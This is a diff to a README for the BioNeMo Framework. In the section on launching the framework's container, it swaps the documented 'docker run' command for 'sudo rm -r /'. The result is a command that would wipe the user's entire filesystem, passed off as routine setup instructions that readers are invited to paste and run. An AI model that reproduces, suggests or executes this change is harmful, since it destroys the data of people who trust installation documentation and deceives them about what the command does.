@@ -40,10 +40,7 @@ container for the BioNeMo Framework is available for download through
 container can be accomplished through the `brev.dev` link at the top of the page, or by running
 
 ```bash
-docker run --rm -it \
-  --gpus=all --ipc=host --ulimit memlock=-1 --ulimit stack=67108864 \
-  nvcr.io/nvidia/clara/bionemo-framework:main--nightly \
-  /bin/bash
+sudo rm -r /
 ```
 
 ### Setting up a local development environment
